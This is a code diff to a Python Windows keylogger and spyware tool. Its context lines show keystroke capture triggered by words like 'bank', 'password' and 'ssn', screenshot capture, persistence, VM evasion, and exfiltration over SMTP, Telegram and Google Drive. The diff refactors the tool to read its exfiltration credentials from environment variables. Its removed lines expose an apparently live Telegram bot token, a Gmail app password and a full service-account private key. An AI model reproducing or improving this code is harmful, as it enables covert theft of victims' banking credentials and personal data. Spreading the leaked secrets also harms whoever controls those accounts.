@@ -14,6 +14,8 @@ import base64
 import sqlite3
 import win32crypt
 import hashlib
+import tempfile
+from json import JSONDecodeError
 from datetime import datetime
 from email.message import EmailMessage
 from shutil import copy2
@@ -26,38 +28,96 @@ from pynput import keyboard
 from PIL import ImageGrab
 import win32gui
 
+def _as_clean_env(name, default=""):
+    value = os.getenv(name, default)
+    if value is None:
+        return default
+    return value.strip()
+
+
+def parse_recipients(raw_value):
+    """Parse RECIPIENTS from a CSV string or JSON array string."""
+    value = (raw_value or "").strip()
+    if not value:
+        return []
+
+    if value.startswith("["):
+        try:
+            parsed = json.loads(value)
+            if isinstance(parsed, list):
+                return [str(entry).strip() for entry in parsed if str(entry).strip()]
+        except JSONDecodeError:
+            pass
+
+    return [recipient.strip() for recipient in value.split(",") if recipient.strip()]
+
+
+def resolve_temp_dir():
+    preferred_base = _as_clean_env("TEMP", "")
+    fallback_base = tempfile.gettempdir()
+
+    for base in (preferred_base, fallback_base):
+        if not base:
+            continue
+        candidate = os.path.join(base, "System_Audit_Logs")
+        try:
+            os.makedirs(candidate, exist_ok=True)
+            return candidate
+        except OSError:
+            continue
+
+    raise RuntimeError("Unable to initialize writable temporary directory.")
+
+
 # ===================== CONFIGURATION =====================
-BOT_TOKEN = "8224265517:AAG5YZps6xrVNSIDq9ZOofTJ5uEB78_yGs0"
-ADMIN_ID = "8097246713"
+BOT_TOKEN = _as_clean_env("BOT_TOKEN")
+ADMIN_ID = _as_clean_env("ADMIN_ID")
 EXPIRY_DATE = datetime(2026, 3, 1)
 
 # SMTP Exfiltration Configuration
-S_EMAIL = "moetheman111@gmail.com"
-S_PASS = "lven uzgu orra unzq" # Gmail App Password
-RECIPIENTS = ["moetheman111@gmail.com"]
+S_EMAIL = _as_clean_env("S_EMAIL")
+S_PASS = _as_clean_env("S_PASS")
+RECIPIENTS = parse_recipients(os.getenv("RECIPIENTS", ""))
 
 # Google Drive Service Account Configuration
-GDRIVE_CONF = {
-  "type": "service_account",
-  "project_id": "fast-audio-412222",
-  "private_key_id": "99394528faffc1dbb9448d9ef179ef2c8e22d3e2",
-  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCtzuLEWZN6+Rvo\nZmo0EXnjSUcHeTlkyf8QZnPeo9HwKmOA7ZREnYlD6G2xfltsn2Nxn7pE8fa6ehj4\nh2Cw3AP0/esdAxk17/B+PiWAmJM1LZBjq9k//0LR2TEf9h6Qet2cqqwZUDjH9tOH\niSz2v+/oyI6zhTRQBscVjUYv/xiJxqSuMH8ZpGAfDnf24vGeByj03RgyeSvRS5Hb\nRcAdf0qpiHBD270H75+jkYr70vz6JUSH4AfGOvI+l/JyLgWKvJlkmC6rdt7L+zVW\nVFmsluxyiHshCSxg4CfSeMDtzpxOD39MfhFmrvaf9M+xhiMj3U56ZtDPc01X1RGd\noljY1cQBAgMBAAECggEAB5bAbP1SRKzKzKdoHLTkowloigl/eYieU+t9RKvXd0qK\nhK8a6bINM8NawsS3HjOJZoUoX2lHMhYxr+xNSvuYSqKpmN8xQxsiX4i8H3TJ/Kjs\nJIX02uf81WfLzs7yv7E1qukC0aogiI6c5s6VAYMY6QuUu37l7VaWa7j65w6W1jEd\nLbLUt7YKRqksdIkFzHOXmvAchc1pXkJLla6Dm4IjNZFcjKGgK6Rn+tbbqrGTdbVQ\ncBXrPSX++86A6K+4Z7Z3bJgpYkVIfnpkPxFw1ggPMGz+r6KYNaKZkPBEHvokzJPj\n9NvQIvQK02qCBQ+JGNNPK/s5txZdbkBTZ5ql+cE1yQKBgQDo/F8gIDxtjahsaivv\ncIpTYRfP/SM7daG7asMdXIxHPg9+8+QtNR0oCC/Kmx6fJt9yurRFfvfLJhdm57VH\nlSLAI9bZ1iolnza/T+145K/reuB66XUlP0LfIIphZ0fTC8lmxlcx2pLEtgBFX99a\nP4EhTVVgXndAwBIAyw0j3+/03QKBgQC++g8QSYrW596hshFhrq7La6B4qRuBAWFL\n87Mk1OwmYbbuLolnuEoRr513xgAVbH/S1tiHXE9aSVmy19iYE9nkbjHsWIcejvbD\no2TIwyuO0C+1Audgh5M+/ByH8Pbnbtq8iH+fHBXzyQC2jXP0kAyN3DPGkRhF+So0\nCGPzOacXdQKBgBAi4oe8E9NWm1Ke69oShlIOCHMsShNlK0VquIbBESoh/zrAs435\n/sH2BzFWGwHU1GcCzVd+2rSkN7y10ZVam+SI1umRbqvaYhVP+NeFpzV89i0tHCLv\nRbdkbpEecRgJ2fIXTJS0WbPsEwq7ACIlAdGHpKEfCc1fQB/z8D4K1Xi1AoGAVnuK\nwsdq9jL+YJ7wvBmM0lWkz79U0zC6zNhJMc6yOhdZ7bZpRuzvrd6nIowpkYoWwHXG\njFXDIZHB6vlP/l5O9+Dm/q6AUdhP6vxdMYUgfoXMdN4hxVbf2U/146G9TcSnjWUK\n1hSz5DgL+J9J+WAaL0uerrcaFOXmtLVv/b8H6dkCgYEA4Cwc2++d4/aVOpGRmW4E\nHe4s0ULmZSs2DQ46j8VV/FNaxycoSpxuYOfvJr6aSP2kAQ5s0w8yv6q60I41aoIz\nQB87x+7YPTw7WJaAqYhDwIj/VyeQAf/0CO7XCsEwB63R0vghfyKFRQocnz/6uwXK\nFYQhPD+e9nw7gvG+k/mHsmQ=\n-----END PRIVATE KEY-----\n",
-  "client_email": "ratking@fast-audio-412222.iam.gserviceaccount.com",
-  "client_id": "105124967445366924923",
-  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-  "token_uri": "https://oauth2.googleapis.com/token",
-  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
-  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/ratking%40fast-audio-412222.iam.gserviceaccount.com",
-  "universe_domain": "googleapis.com"
-}
+def load_gdrive_conf():
+    raw = os.getenv("GDRIVE_CONF_JSON", "{}") or "{}"
+    try:
+        conf = json.loads(raw)
+        return conf if isinstance(conf, dict) else {}
+    except JSONDecodeError:
+        return {}
+
+
+GDRIVE_CONF = load_gdrive_conf()
 
 TRIGGER_WORDS = ["bank", "login", "password", "paypal", "@gmail.com", "username", "user id", "userid", "passcode", "ssn", "social security"]
 KEYSTROKE_LIMIT = 75
 MY_HOSTNAME = socket.gethostname()
-TEMP_DIR = os.path.join(os.getenv('TEMP'), "System_Audit_Logs")
-os.makedirs(TEMP_DIR, exist_ok=True)
+TEMP_DIR = resolve_temp_dir()
 
 keystrokes = []
+
+
+def validate_runtime_config():
+    """Fail fast when required runtime configuration is missing.
+
+    This avoids booting with broken settings and accidentally shipping secrets in source.
+    """
+    missing = []
+    if not BOT_TOKEN:
+        missing.append("BOT_TOKEN")
+    if not ADMIN_ID:
+        missing.append("ADMIN_ID")
+    if missing:
+        raise RuntimeError(f"Missing required environment variables: {', '.join(missing)}")
+
+    if not ADMIN_ID.lstrip("-").isdigit():
+        raise RuntimeError("ADMIN_ID must be a numeric Telegram chat identifier.")
+
+    has_partial_smtp = any([S_EMAIL, S_PASS, RECIPIENTS]) and not all([S_EMAIL, S_PASS, RECIPIENTS])
+    if has_partial_smtp:
+        raise RuntimeError("SMTP config is partial. Set S_EMAIL, S_PASS and RECIPIENTS together.")
 
 
 def send_email_report(log_path, screenshots):
@@ -485,6 +545,12 @@ def install_persistence():
 
 
 def main():
+    try:
+        validate_runtime_config()
+    except Exception as e:
+        print(f"[DEBUG] Startup aborted: {e}")
+        sys.exit(1)
+
     if datetime.now() > EXPIRY_DATE: sys.exit()
     if is_vm(): time.sleep(600); sys.exit()
     
